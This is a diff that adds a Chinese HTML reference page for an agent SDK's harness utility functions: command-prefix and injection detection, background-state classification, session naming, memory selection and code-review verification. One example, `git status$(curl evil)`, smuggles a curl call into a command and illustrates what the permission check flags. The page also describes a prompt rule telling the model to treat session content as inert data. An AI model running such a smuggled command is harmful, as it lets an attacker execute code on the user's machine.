@@ -1,0 +1,305 @@
+<title>BPT Agent SDK · Harness 侧工具函数</title>
+<style>
+:root {
+  --ground:#eef0f4; --surface:#ffffff; --surface2:#f5f6f9; --ink:#1b2230; --muted:#5a6474;
+  --faint:#8a93a2; --border:#dde1e9; --border2:#c6ccd6;
+  --accent:#b3701a; --accent-ink:#8a560f; --accent-soft:#b3701a17;
+  --good:#2a7d5f; --warn:#b3701a; --code-bg:#11161f; --code-ink:#cdd8e6; --code-bd:#232c3a;
+  --shadow:0 1px 2px rgba(20,28,42,.05),0 10px 26px -14px rgba(20,28,42,.16);
+}
+@media (prefers-color-scheme:dark){:root{
+  --ground:#0c0f14; --surface:#141a23; --surface2:#10151d; --ink:#dbe2ec; --muted:#8b95a4;
+  --faint:#69727f; --border:#232b36; --border2:#333d49;
+  --accent:#e0a24e; --accent-ink:#f0c584; --accent-soft:#e0a24e1f;
+  --good:#4cba8c; --warn:#e0a24e; --code-bg:#0a0e14; --code-ink:#c4cfdd; --code-bd:#1b2430;
+  --shadow:0 1px 2px rgba(0,0,0,.3),0 12px 30px -16px rgba(0,0,0,.6);
+}}
+:root[data-theme="light"]{--ground:#eef0f4;--surface:#fff;--surface2:#f5f6f9;--ink:#1b2230;--muted:#5a6474;--faint:#8a93a2;--border:#dde1e9;--border2:#c6ccd6;--accent:#b3701a;--accent-ink:#8a560f;--accent-soft:#b3701a17;--good:#2a7d5f;--warn:#b3701a;--code-bg:#11161f;--code-ink:#cdd8e6;--code-bd:#232c3a;}
+:root[data-theme="dark"]{--ground:#0c0f14;--surface:#141a23;--surface2:#10151d;--ink:#dbe2ec;--muted:#8b95a4;--faint:#69727f;--border:#232b36;--border2:#333d49;--accent:#e0a24e;--accent-ink:#f0c584;--accent-soft:#e0a24e1f;--good:#4cba8c;--warn:#e0a24e;--code-bg:#0a0e14;--code-ink:#c4cfdd;--code-bd:#1b2430;}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--ground);color:var(--ink);line-height:1.65;
+ font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans SC",system-ui,sans-serif;-webkit-font-smoothing:antialiased}
+code,.mono{font-family:ui-monospace,"SF Mono","JetBrains Mono",Menlo,Consolas,monospace}
+.wrap{max-width:1120px;margin:0 auto;padding:0 clamp(16px,4vw,40px)}
+a{color:var(--accent-ink)}
+
+header.mast{border-bottom:1px solid var(--border);background:linear-gradient(180deg,var(--surface),var(--ground))}
+.mast .wrap{padding:clamp(30px,6vw,58px) clamp(16px,4vw,40px) clamp(22px,4vw,36px)}
+.eyebrow{font-family:ui-monospace,Menlo,monospace;font-size:12px;letter-spacing:.22em;text-transform:uppercase;
+ color:var(--accent-ink);margin:0 0 14px;display:flex;gap:10px;align-items:center}
+.eyebrow::before{content:"";width:26px;height:1px;background:var(--accent);display:inline-block}
+h1{font-size:clamp(27px,4.6vw,42px);line-height:1.1;margin:0 0 12px;font-weight:700;letter-spacing:-.015em;text-wrap:balance}
+.lede{max-width:64ch;color:var(--muted);font-size:clamp(15px,1.6vw,17px);margin:0 0 24px}
+.lede code{background:var(--surface2);padding:1px 6px;border-radius:5px;border:1px solid var(--border);font-size:.9em;color:var(--ink)}
+.stats{display:flex;flex-wrap:wrap;gap:10px}
+.stat{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:11px 15px;box-shadow:var(--shadow)}
+.stat b{display:block;font-size:22px;font-weight:700;letter-spacing:-.02em;font-variant-numeric:tabular-nums}
+.stat span{font-size:12px;color:var(--muted)}
+
+.layout{display:grid;grid-template-columns:210px 1fr;gap:34px;align-items:start;padding:32px 0 80px}
+nav.toc{position:sticky;top:18px;font-size:13.5px;display:flex;flex-direction:column;gap:2px}
+nav.toc .th{font-family:ui-monospace,Menlo,monospace;font-size:11px;letter-spacing:.16em;text-transform:uppercase;color:var(--faint);margin:0 0 8px 12px}
+nav.toc a{padding:7px 12px;border-radius:8px;color:var(--muted);text-decoration:none;border-left:2px solid transparent;transition:.15s}
+nav.toc a:hover{background:var(--accent-soft);color:var(--ink);border-left-color:var(--accent)}
+main{min-width:0;display:flex;flex-direction:column;gap:16px}
+
+.block{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:22px 24px;box-shadow:var(--shadow)}
+.bhead h2{font-size:19px;margin:0 0 6px;font-weight:700;display:flex;gap:10px;align-items:baseline;flex-wrap:wrap}
+.tag{font-family:ui-monospace,Menlo,monospace;font-size:11px;font-weight:500;color:var(--accent-ink);background:var(--accent-soft);border:1px solid var(--accent);border-radius:20px;padding:2px 9px}
+.bsub{margin:0 0 16px;color:var(--muted);font-size:14px}
+.bsub code{font-family:ui-monospace,Menlo,monospace;font-size:.9em;color:var(--ink)}
+.dnagrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px}
+.dna{display:flex;gap:12px;background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:12px 14px}
+.dna b{flex:none;width:24px;height:24px;border-radius:6px;background:var(--accent-soft);color:var(--accent-ink);
+ border:1px solid var(--accent);display:grid;place-items:center;font-family:ui-monospace,Menlo,monospace;font-size:12px;font-weight:600}
+.dna h4{margin:0 0 3px;font-size:13.5px;font-weight:650}
+.dna p{margin:0;font-size:12.5px;color:var(--muted);line-height:1.55}
+.dna code{font-family:ui-monospace,Menlo,monospace;font-size:.88em;color:var(--ink);background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:0 4px}
+
+.fn{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:20px 24px;box-shadow:var(--shadow);scroll-margin-top:16px}
+.fnhead{display:flex;justify-content:space-between;align-items:flex-start;gap:14px;flex-wrap:wrap}
+.fntitle{display:flex;flex-direction:column;gap:5px;min-width:0}
+.cn{font-size:17px;font-weight:700;letter-spacing:-.01em}
+.sig{font-size:13px;color:var(--accent-ink);word-break:break-word}
+.model{flex:none;font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:var(--warn);border:1px solid var(--warn);
+ border-radius:20px;padding:2px 10px;white-space:nowrap}
+.ret{display:block;margin:10px 0 0;font-size:12.5px;color:var(--muted);background:var(--surface2);border:1px solid var(--border);
+ border-radius:7px;padding:7px 11px;overflow-x:auto;white-space:pre}
+.rowmeta{display:flex;gap:14px;flex-wrap:wrap;align-items:baseline;margin:11px 0 4px}
+.rowmeta .file{font-family:ui-monospace,Menlo,monospace;font-size:12px;text-decoration:none;border-bottom:1px dashed var(--accent)}
+.rowmeta .trigger{font-size:12.5px;color:var(--muted)}
+.fnbody{display:flex;flex-direction:column;gap:12px;margin-top:12px}
+.seg h5{margin:0 0 4px;font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent-ink);
+ font-family:ui-monospace,Menlo,monospace}
+.seg p{margin:0;font-size:14.5px;color:var(--ink)}
+.seg ul{margin:0;padding-left:18px;display:flex;flex-direction:column;gap:5px}
+.seg li{font-size:13.5px;color:var(--ink)}
+.seg code,.seg li code,.seg p code{font-family:ui-monospace,Menlo,monospace;font-size:.88em;background:var(--code-bg);
+ color:var(--code-ink);border:1px solid var(--code-bd);border-radius:4px;padding:1px 5px}
+.failsafe{display:flex;gap:10px;align-items:baseline;background:var(--surface2);border:1px solid var(--border);
+ border-left:3px solid var(--good);border-radius:8px;padding:9px 13px;font-size:13px;color:var(--muted)}
+.fslabel{flex:none;font-family:ui-monospace,Menlo,monospace;font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;
+ color:var(--good);font-weight:600}
+
+.adjgrid{display:flex;flex-direction:column;gap:10px}
+.adj{background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:12px 15px}
+.adjt{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;align-items:baseline;margin-bottom:4px}
+.adjt b{font-size:14px}
+.adjt a{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;text-decoration:none;border-bottom:1px dashed var(--accent)}
+.adj p{margin:0;font-size:13px;color:var(--muted)}
+.adj code{font-family:ui-monospace,Menlo,monospace;color:var(--ink)}
+
+footer{border-top:1px solid var(--border);color:var(--muted);font-size:13px}
+footer .wrap{padding:24px 0 60px;display:flex;flex-direction:column;gap:5px}
+footer code{font-family:ui-monospace,Menlo,monospace;color:var(--ink)}
+
+@media (max-width:820px){.layout{grid-template-columns:1fr;gap:6px}
+ nav.toc{position:static;flex-flow:row wrap;margin-bottom:14px}
+ nav.toc .th{width:100%;margin-left:0}}
+@media (prefers-reduced-motion:reduce){*{transition:none!important;scroll-behavior:auto}}
+</style>
+
+<header class="mast"><div class="wrap">
+<p class="eyebrow">银芯 · BPT AGENT SDK · Harness 参考</p>
+<h1>Harness 侧工具函数</h1>
+<p class="lede">Claude Code 的一批「黑盒产品功能」在 SDK 里被复刻成 <strong>opt-in 独立函数</strong>——命名会话、推手机通知、挑记忆、判权限、code-review 核验。agent loop <strong>一个都不自动触发</strong>（唯一自动的是上下文压缩）；host 在自己的产品生命周期点上按需调。全部默认 <code>claude-haiku-4-5</code>、单发、温度 0、失败朝安全。</p>
+<div class="stats">
+<div class="stat"><b>8</b><span>产品功能函数</span></div>
+<div class="stat"><b>1</b><span>自动（仅压缩）</span></div>
+<div class="stat"><b>Haiku</b><span>统一默认模型</span></div>
+<div class="stat"><b>faithful</b><span>官方复刻 prompt</span></div>
+</div>
+</div></header>
+
+<div class="wrap"><div class="layout">
+<nav class="toc"><p class="th">8 个函数</p><a href="#cmdprefix">命令前缀检测</a>
+<a href="#bgstate">后台状态分类</a>
+<a href="#title">会话标题</a>
+<a href="#titlebranch">标题 + 分支</a>
+<a href="#rename">会话名 /rename</a>
+<a href="#away">离开回顾</a>
+<a href="#memory">记忆挑选</a>
+<a href="#verify">对抗性核验</a></nav>
+<main>
+<section class="block" id="dna">
+<div class="bhead"><h2>共用实现 DNA <span class="tag">runUtilityCall 底座</span></h2>
+<p class="bsub">8 个函数（+ verifier）全是同一个 <code>runUtilityCall</code>（<a href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/generators/runtime.ts">generators/runtime.ts</a>）薄封装。理解这 6 条，就理解了全部。</p></div>
+<div class="dnagrid"><div class="dna"><b>1</b><div><h4>单发 · 无工具 · temperature=0</h4><p>每个都是一次 Messages API 调用，system + user 一问一答，温度钉 0 → 同输入同标签、可复现。不挂任何工具（runtime.ts:92）。</p></div></div>
+<div class="dna"><b>2</b><div><h4>廉价 Haiku 默认，可覆盖</h4><p>机械单轮活默认 <code>claude-haiku-4-5</code>，<code>opts.model</code> 可换（这正是接 SDK 函数会吃到的那颗地雷）。</p></div></div>
+<div class="dna"><b>3</b><div><h4>忠实复刻 prompt + 硬化纯解析器</h4><p>system 是对账过的官方复刻文本（faithful:true）；出参交给一个零 I/O、可单测的纯解析器（parseXxx）。</p></div></div>
+<div class="dna"><b>4</b><div><h4>失败一律朝「安全」方向</h4><p>注入→闭合、后台→不打扰、记忆→不附、判定→REFUTED。乱码/半截回复永不造成危险后果。</p></div></div>
+<div class="dna"><b>5</b><div><h4>import-only · 自建 transport</h4><p>模块无副作用，从公开 options 自建 transport → 可在 live query() 之外单独触发（会话开始前先命名、通知层判已结束的后台 run）；transport 可注入 → 离线零网络单测。</p></div></div>
+<div class="dna"><b>6</b><div><h4>abort 朝「响亮」失败</h4><p>流中取消一律 reject、绝不返回半截文本——否则 detectCommandPrefix 可能把截断片段当良性前缀交回（runtime.ts:101）。</p></div></div></div></section>
+<section class="fn" id="cmdprefix">
+<div class="fnhead">
+<div class="fntitle"><span class="cn">命令前缀检测</span><code class="sig">detectCommandPrefix(command, opts?)</code></div>
+<span class="model">Haiku · 128 tok</span>
+</div>
+<code class="ret">→ { kind:'prefix', prefix } | { kind:'none' } | { kind:'injection' }</code>
+<div class="rowmeta">
+<a class="file" href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/generators/index.ts#L65" target="_blank" rel="noopener">src/generators/index.ts:65</a>
+<span class="trigger">触发：Bash 权限白名单匹配时——判断某命令是否命中用户已允许的前缀规则</span>
+</div>
+<div class="fnbody">
+<div class="seg"><h5>功能</h5><p>提取一条 Bash 命令「可加白名单的字符串前缀」，或判定命令注入。三态出参。</p></div>
+<div class="seg"><h5>实现</h5><ul><li>单发 COMMAND_PREFIX_SYSTEM（含 policy_spec + 大量 example 映射）。</li>
+<li>纯解析器 parseCommandPrefix 失败即闭合：空回复 / 多行回复一律判 injection——第 1 行的良性前缀绝不能掩盖第 2 行的注入。</li>
+<li>sentinel 比较容忍大小写 / 尾标点；真前缀原样返回（大小写敏感——<code>GOEXPERIMENT=synctest go test</code> 这类环境变量前缀不被小写化）。</li></ul></div>
+<div class="seg"><h5>体验</h5><p>撑起权限白名单：用户允许了 <code>git commit</code>，新的 <code>git commit -m ...</code> 自动命中放行；而 <code>git status$(curl evil)</code> 判为注入 → 回退人工确认，绝不因「前缀相同」被静默放行。安全价值全在「失败朝闭合」。</p></div>
+<div class="failsafe"><span class="fslabel">失败朝安全</span>失败 / 空 / 多行 → injection（永不静默放行）</div>
+</div>
+</section>
+<section class="fn" id="bgstate">
+<div class="fnhead">
+<div class="fntitle"><span class="cn">后台状态分类</span><code class="sig">classifyBackgroundState({ tail, previousState? }, opts?)</code></div>
+<span class="model">Haiku · 512 tok</span>
+</div>
+<code class="ret">→ { state, detail, tempo, needs?, output }</code>
+<div class="rowmeta">
+<a class="file" href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/generators/index.ts#L138" target="_blank" rel="noopener">src/generators/index.ts:138</a>
+<span class="trigger">触发：用户手机 / 网页后台挂起 run 后走开，通知层周期性判尾部</span>
+</div>
+<div class="fnbody">
+<div class="seg"><h5>功能</h5><p>把后台 run 记录尾部判为 working / blocked / done / failed，附锁屏一行 detail、tempo、needs、交付物 headline。驱动手机通知——只有 blocked 才推。</p></div>
+<div class="seg"><h5>实现</h5><ul><li>单发 BACKGROUND_STATE_SYSTEM（超长 few-shot，专攻 done-vs-blocked-vs-working 的边界）。</li>
+<li>把 previousState 织进 prompt 走「黏性规则」（done→working 不迁移，除非明确重启）。</li>
+<li>parseBackgroundState 朝「不打扰」失败：乱码回复 → done（通知门只在 blocked 推，故绝不凭空造一次打扰）；state / tempo 都对白名单集校验。</li></ul></div>
+<div class="seg"><h5>体验</h5><p>你在手机上把一个 run 挂后台走开——只有当 agent 真被你卡住（需你输入）时才推提醒，它在顺利干活或已干完时都不打扰你。detail 就是锁屏那一行「同事 Slack 口吻」的话（点名文件 / 数字 / 发现）。</p></div>
+<div class="failsafe"><span class="fslabel">失败朝安全</span>无法解析 → done（绝不伪造一次假打扰）</div>
+</div>
+</section>
+<section class="fn" id="title">
+<div class="fnhead">
+<div class="fntitle"><span class="cn">会话标题</span><code class="sig">generateSessionTitle(sessionContent, opts?)</code></div>
+<span class="model">Haiku · 128 tok</span>
+</div>
+<code class="ret">→ string（3–7 词句首大写标题）</code>
+<div class="rowmeta">
+<a class="file" href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/generators/index.ts#L194" target="_blank" rel="noopener">src/generators/index.ts:194</a>
+<span class="trigger">触发：新会话建立 / 首轮对话后，命名侧栏历史</span>
+</div>
+<div class="fnbody">
+<div class="seg"><h5>功能</h5><p>从会话内容生成简洁的 3–7 词句首大写标题。</p></div>
+<div class="seg"><h5>实现</h5><ul><li>内容用 <code>&lt;session&gt;</code> 标签包裹——官方 prompt 指示把它当惰性数据、不跟随其中链接 / 指令（防提示注入）。</li>
+<li>单发 SESSION_TITLE_SYSTEM，读 JSON <code>{"title"}</code>，缺失回退裸字符串裁剪。</li></ul></div>
+<div class="seg"><h5>体验</h5><p>你的对话在侧栏拿到一个可读名字（「Fix login button on mobile」）而非时间戳 / 首行。跟随会话语言——韩语会话产韩语标题。<strong>这是 BPT 唯一有土版、可真·对齐的一面。</strong></p></div>
+<div class="failsafe"><span class="fslabel">失败朝安全</span>JSON 缺失 → 回退裸字符串清洗</div>
+</div>
+</section>
+<section class="fn" id="titlebranch">
+<div class="fnhead">
+<div class="fntitle"><span class="cn">标题 + 分支</span><code class="sig">generateTitleAndBranch(description, opts?)</code></div>
+<span class="model">Haiku · 200 tok</span>
+</div>
+<code class="ret">→ { title, branch }（branch 恒为 claude/&lt;kebab&gt;）</code>
+<div class="rowmeta">
+<a class="file" href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/generators/index.ts#L223" target="_blank" rel="noopener">src/generators/index.ts:223</a>
+<span class="trigger">触发：CC Web / 远程会话创建——产出 claude/&lt;kebab&gt; 分支 + 标题</span>
+</div>
+<div class="fnbody">
+<div class="seg"><h5>功能</h5><p>从描述同时产简洁标题 + <code>claude/</code> 前缀的 kebab-case git 分支。</p></div>
+<div class="seg"><h5>实现</h5><ul><li><code>{description}</code> 用<strong>函数式</strong> replace 插值——描述里的 <code>$$</code> / <code>$&amp;</code> / `<code> $</code> `<code> 不被误当替换宏（否则会静默吞 </code>$` 或把 prompt 前缀拼错）。</li>
+<li>normalizeBranch 防御式强制合法分支：小写、非字母数字→短横、强制 <code>claude/</code> 前缀、回退到 slug 化标题、再回退常量 <code>session</code>——哪怕模型回复跑偏也保证一个非空可 checkout 分支。</li></ul></div>
+<div class="seg"><h5>体验</h5><p>就是开出<strong>本会话</strong>那套流程——你描述任务，它既命名会话又建出 <code>claude/fix-mobile-login</code> 这样的分支（如本会话的 <code>claude/bpt-agent-sdk-prompts-880fau</code>）。</p></div>
+<div class="failsafe"><span class="fslabel">失败朝安全</span>分支防御式规范化，永远产出可 checkout 名</div>
+</div>
+</section>
+<section class="fn" id="rename">
+<div class="fnhead">
+<div class="fntitle"><span class="cn">会话名 /rename</span><code class="sig">generateSessionName(conversation, opts?)</code></div>
+<span class="model">Haiku · 64 tok</span>
+</div>
+<code class="ret">→ string（2–4 词 kebab slug）</code>
+<div class="rowmeta">
+<a class="file" href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/generators/index.ts#L273" target="_blank" rel="noopener">src/generators/index.ts:273</a>
+<span class="trigger">触发：用户敲 /rename（无参）</span>
+</div>
+<div class="fnbody">
+<div class="seg"><h5>功能</h5><p>从对话上下文产 2–4 词 kebab-case 名。</p></div>
+<div class="seg"><h5>实现</h5><ul><li>单发 SESSION_NAME_SYSTEM，结果规范化成合法 kebab slug（小写、非字母数字→短横、去首尾横线）；空则回退 <code>session</code>。</li></ul></div>
+<div class="seg"><h5>体验</h5><p><code>/rename</code> 不带参就自动起个安全的标识名（<code>fix-login-bug</code>），可直接当名字 / 标识用。</p></div>
+<div class="failsafe"><span class="fslabel">失败朝安全</span>规范化到合法 kebab slug，回退 'session'</div>
+</div>
+</section>
+<section class="fn" id="away">
+<div class="fnhead">
+<div class="fntitle"><span class="cn">离开回顾</span><code class="sig">generateAwaySummary(tail, opts?)</code></div>
+<span class="model">Haiku · 128 tok</span>
+</div>
+<code class="ret">→ string（&lt;40 词、1–2 句、无 markdown）</code>
+<div class="rowmeta">
+<a class="file" href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/generators/index.ts#L297" target="_blank" rel="noopener">src/generators/index.ts:297</a>
+<span class="trigger">触发：用户回到后台 run——「趁你不在」欢迎回来回顾</span>
+</div>
+<div class="fnbody">
+<div class="seg"><h5>功能</h5><p>从记录尾部产不到 40 词、1–2 句朴素回顾。</p></div>
+<div class="seg"><h5>实现</h5><ul><li>单发 AWAY_SUMMARY_SYSTEM。</li>
+<li>parseAwaySummary 剥 markdown（代码围栏 / 标题 / 强调），但<strong>刻意不剥下划线</strong>——<code>run_query</code> / <code>db_client.py</code> 这类 snake_case / 路径远比 markdown 强调常见，盲剥会静默损坏真内容。</li>
+<li>折成一行；<strong>不硬截断</strong>（40 词是模型侧指令，不在解析器悄悄执行）。</li></ul></div>
+<div class="seg"><h5>体验</h5><p>你回到一个后台 run，拿到 1–2 句「进展到哪了、下一步做啥」而不用滚整段记录。</p></div>
+<div class="failsafe"><span class="fslabel">失败朝安全</span>纯文本清洗（非结构化，无致命失败面）</div>
+</div>
+</section>
+<section class="fn" id="memory">
+<div class="fnhead">
+<div class="fntitle"><span class="cn">记忆挑选</span><code class="sig">selectMemoryFilesToAttach({ available, query }, opts?)</code></div>
+<span class="model">Haiku · 256 tok</span>
+</div>
+<code class="ret">→ string[]（available 的子集，≤5）</code>
+<div class="rowmeta">
+<a class="file" href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/generators/index.ts#L347" target="_blank" rel="noopener">src/generators/index.ts:347</a>
+<span class="trigger">触发：查询时记忆文件很多——挑相关的附上、省上下文</span>
+</div>
+<div class="fnbody">
+<div class="seg"><h5>功能</h5><p>从 {filename, description} 集合里挑至多 5 个与查询相关的记忆文件。</p></div>
+<div class="seg"><h5>实现</h5><ul><li>MEMORY_FILES_SYSTEM + 输出契约（JSON 数组）；单发。</li>
+<li>parseMemoryFileSelection <strong>只返回在 available 集合里的文件名</strong>（丢幻觉 + 去重）、封顶 5、失败朝空数组。</li>
+<li>平衡括号 + 字符串字面量感知的 JSON 数组解析——<code>["db.md"] (see config[env])</code> 这类尾随散文不会把切片撑过真正的数组结尾。</li></ul></div>
+<div class="seg"><h5>体验</h5><p>记忆文件一多，只有相关的被附到某次查询——上下文保持精简、无需你手动管；关键是它<strong>绝不会附一个幻觉出来的文件名</strong>（只从你给的集合里挑）。</p></div>
+<div class="failsafe"><span class="fslabel">失败朝安全</span>幻觉文件名一律丢弃；无法解析 → [] (啥都不附)</div>
+</div>
+</section>
+<section class="fn" id="verify">
+<div class="fnhead">
+<div class="fntitle"><span class="cn">对抗性核验</span><code class="sig">adversarialVerify(finding, opts?)</code></div>
+<span class="model">Haiku · 512 tok</span>
+</div>
+<code class="ret">→ { verdict, keep, quote?, rationale, confirms? }</code>
+<div class="rowmeta">
+<a class="file" href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/verifier/index.ts#L105" target="_blank" rel="noopener">src/verifier/index.ts:105</a>
+<span class="trigger">触发：/code-review 技能的核验阶段——逐条候选发现复核</span>
+</div>
+<div class="fnbody">
+<div class="seg"><h5>功能</h5><p>把一条候选 code-review 发现判为 CONFIRMED / PLAUSIBLE / REFUTED 三态，编码「保留非 REFUTED」为 keep 标志。召回偏置（默认 PLAUSIBLE）。</p></div>
+<div class="seg"><h5>实现</h5><ul><li>buildVerifierUserTurn 拼 diff / 位置 / 类别为证据；runVerification 单发 VERIFY_VERDICT_SYSTEM，model = opts.model ?? Haiku。</li>
+<li>parseVerdict <strong>失败朝闭合</strong>：JSON 回复权威、verdict 字段缺失 / 非法 → REFUTED（绝不从 rationale 散文里捞一个 verdict 词伪造保留）。</li>
+<li>半截 JSON（max_tokens 截断）也判 REFUTED；只有「完全无花括号」才当裸词判定，且必须<strong>恰好一个</strong> verdict 词、歧义 → REFUTED。</li></ul></div>
+<div class="seg"><h5>体验</h5><p>/code-review 的核验闸——每条候选 bug 被对抗性复核：假阳（REFUTED）丢弃、真的 / 不确定的（CONFIRMED / PLAUSIBLE）保留。召回偏置让它不过度否掉现实可达的 bug；「不测不宣胜负」——没证成的发现不靠「疑罪从有」存活。</p></div>
+<div class="failsafe"><span class="fslabel">失败朝安全</span>乱码 / 歧义 / 半截 JSON → REFUTED（keep:false）</div>
+</div>
+</section>
+<section class="block" id="adjacent">
+<div class="bhead"><h2>相邻的 harness 侧工具（不在这 8 个内）</h2>
+<p class="bsub">同为 harness 侧的模型调用，但触发方式 / 定位不同，附此备案。</p></div>
+<div class="adjgrid"><div class="adj"><div class="adjt"><b>上下文压缩摘要 SUMMARIZER_SYSTEM</b><a href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/engine/compaction.ts">src/engine/compaction.ts</a></div><p>唯一被 agent loop **自动**触发的——上下文接近窗口时把旧回合折叠成摘要。这是真·harness 原语（上下文管理），默认走**会话模型**（非 Haiku）。与下面 8 个「产品功能」性质不同：它是循环必需件。</p></div>
+<div class="adj"><div class="adjt"><b>上下文提示条 ×2（selectContextTip / evaluateTipReception）</b><a href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/tips/index.ts">src/tips/index.ts</a></div><p>干活时偶尔冒一条功能小贴士 + 事后判接收。opt-in，Haiku 默认。</p></div>
+<div class="adj"><div class="adjt"><b>钩子条件评估 ×2（evaluateHookCondition / stop）</b><a href="https://github.com/lightproud/brain-in-a-vat/blob/main/projects/bpt-agent-sdk/src/hooks/condition.ts">src/hooks/condition.ts</a></div><p>钩子带自然语言条件时判是否满足，返回 {ok, reason}。半自动（host 配置钩子时触发），Haiku 默认。</p></div></div></section>
+</main>
+</div></div>
+
+<footer><div class="wrap">
+<div>源：<code>lightproud/brain-in-a-vat · projects/bpt-agent-sdk/src/{generators,verifier}/</code>（main）</div>
+<div>定位：这层是「CC 产品功能复刻」，与 harness 核心（query / 工具 / 子代理 / 压缩 / 权限 / 钩子 / transport）性质不同——opt-in、可复用、按需取。</div>
+<div>模型注记：8 面全默认 <code>claude-haiku-4-5</code>；接 SDK 函数（路径 B）即吃此默认，需 <code>opts.model</code> 覆盖或 options.modelAliases 注入口。</div>
+</div></footer>
+
+<script>
+(function(){
+ var ls=[].slice.call(document.querySelectorAll('nav.toc a'));
+ var ss=ls.map(function(a){return document.getElementById(a.getAttribute('href').slice(1))});
+ function on(){var y=window.scrollY+100,c=0;for(var i=0;i<ss.length;i++){if(ss[i]&&ss[i].offsetTop<=y)c=i}
+  ls.forEach(function(a,i){var on=i===c;a.style.background=on?'var(--accent-soft)':'';a.style.color=on?'var(--ink)':'';a.style.borderLeftColor=on?'var(--accent)':''})}
+ window.addEventListener('scroll',on,{passive:true});on();
+})();
+</script>
